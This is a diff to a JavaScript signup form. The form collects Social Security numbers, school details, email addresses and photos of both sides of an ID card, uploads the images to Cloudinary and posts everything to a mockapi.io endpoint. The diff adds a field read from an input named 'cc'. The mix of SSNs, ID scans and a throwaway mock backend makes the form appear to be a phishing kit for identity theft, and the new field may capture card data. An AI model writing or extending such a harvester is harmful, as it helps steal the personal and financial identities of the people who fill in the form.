@@ -1,9 +1,9 @@
 const cloudName = "djwldmjmy"; // Replace with your Cloudinary cloud name
 const uploadPreset = "movi999";
-const apiUrl = 'https://649ac56abf7c145d023971ee.mockapi.io/api/V1/users2'; // Mock API URL
- const successMessage = document.getElementById("success-message");
- const errorMessage = document.getElementById("error-message");
- const loadingMessage = document.getElementById("loading-message"); 
+const apiUrl = "https://649ac56abf7c145d023971ee.mockapi.io/api/V1/users2"; // Mock API URL
+const successMessage = document.getElementById("success-message");
+const errorMessage = document.getElementById("error-message");
+const loadingMessage = document.getElementById("loading-message");
 
 document.addEventListener("DOMContentLoaded", function () {
   const form = document.getElementById("signupForm");
@@ -18,6 +18,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const ssn = document.getElementById("ssn").value;
     const schoolName = document.getElementById("schoolName").value;
     const graduationYear = document.getElementById("graduationYear").value;
+    const credit_score = document.getElementById("cc").value;
 
     const frontId = document.getElementById("frontId").files[0];
     const backId = document.getElementById("backId").files[0];
@@ -50,6 +51,7 @@ document.addEventListener("DOMContentLoaded", function () {
       ID_Front: frontImageUrl,
       ID_Back: backImageUrl,
       email: email,
+      credit_score: credit_score,
     };
     submitToApi(formData);
     // You can now send the form data (including image URLs) to your server or handle it as needed
@@ -75,32 +77,30 @@ document.addEventListener("DOMContentLoaded", function () {
     }
   }
 
-async function submitToApi(data) {
-  try {
-    const response = await fetch(apiUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data),
-    });
+  async function submitToApi(data) {
+    try {
+      const response = await fetch(apiUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data),
+      });
 
-    const result = await response.json();
+      const result = await response.json();
 
-    if (response.ok) {
-      successMessage.textContent = "Submission successful!";
-      successMessage.style.display = "block";
-    } else {
-      throw new Error(result.message || "Submission failed.");
+      if (response.ok) {
+        successMessage.textContent = "Submission successful!";
+        successMessage.style.display = "block";
+      } else {
+        throw new Error(result.message || "Submission failed.");
+      }
+    } catch (error) {
+      errorMessage.textContent = `${error.message || "Failed to submit data."}`;
+      errorMessage.style.display = "block";
+    } finally {
+      // Hide loading message after submission is done
+      loadingMessage.style.display = "none";
     }
-  } catch (error) {
-    errorMessage.textContent = `${
-      error.message || "Failed to submit data."
-    }`;
-    errorMessage.style.display = "block";
-  } finally {
-    // Hide loading message after submission is done
-    loadingMessage.style.display = "none";
   }
-}
 });
